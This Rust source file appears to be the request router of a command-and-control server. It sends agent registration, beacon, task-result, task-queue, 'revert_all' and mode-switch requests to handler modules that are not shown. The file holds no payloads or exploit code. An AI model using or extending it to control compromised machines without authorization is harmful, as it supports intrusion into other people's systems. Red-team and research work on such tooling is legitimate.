pub mod response;
pub mod agent;
pub mod task;
pub mod mode;

use bytes::Bytes;
use http_body_util::{BodyExt, Full};
use hyper::{Method, Request, Response, StatusCode};
use crate::state::State;
use std::convert::Infallible;
use std::sync::{Arc, Mutex};
use uuid::Uuid;
use response::error_response;

pub async fn handle_request(
    req: Request<hyper::body::Incoming>,
    state: Arc<Mutex<State>>,
) -> Result<Response<Full<Bytes>>, Infallible> {
    let method = req.method().clone();
    let path = req.uri().path().to_string();
    
    println!("[*] {} {}", method, path);

    let body_bytes = match req.collect().await {
        Ok(collected) => collected.to_bytes(),
        Err(_) => return Ok(error_response("Failed to read body", StatusCode::BAD_REQUEST)),
    };

    let response = match (method, path.as_str()) {
        (Method::POST, "/register") => agent::handle_register(&body_bytes, state),
        (Method::POST, "/beacon") => agent::handle_beacon(&body_bytes, state),
        (Method::POST, "/task_result") => agent::handle_task_result(&body_bytes, state),
        (Method::GET, "/agents") => agent::handle_list_agents(state),
        
        (Method::POST, "/add_task") => task::handle_add_task(&body_bytes, state),
        (Method::POST, "/protocol") => task::handle_protocol(&body_bytes, state),
        (Method::POST, "/revert_all") => task::handle_revert_all(&body_bytes, state),
        
        (Method::GET, "/mode") => mode::handle_get_mode(state),
        (Method::POST, "/set_mode") => mode::handle_set_mode(&body_bytes, state),
        
        (Method::GET, path) if path.starts_with("/tasks/") => {
            let task_id_str = path.trim_start_matches("/tasks/");
            let task_id = match Uuid::parse_str(task_id_str) {
                Ok(id) => id,
                Err(_) => return Ok(error_response("Invalid task ID", StatusCode::BAD_REQUEST)),
            };
            task::handle_get_task(task_id, state)
        }

        (Method::GET, path) if path.starts_with("/agent/") && path.contains("/tasks") => {
            let parts: Vec<&str> = path.split('/').collect();
            if parts.len() < 4 {
                return Ok(error_response("Invalid path", StatusCode::BAD_REQUEST));
            }
            
            let agent_id = match Uuid::parse_str(parts[2]) {
                Ok(id) => id,
                Err(_) => return Ok(error_response("Invalid agent ID", StatusCode::BAD_REQUEST)),
            };
            task::handle_list_agent_tasks(agent_id, state)
        }

        _ => error_response("Not Found", StatusCode::NOT_FOUND),
    };

    Ok(response)
}
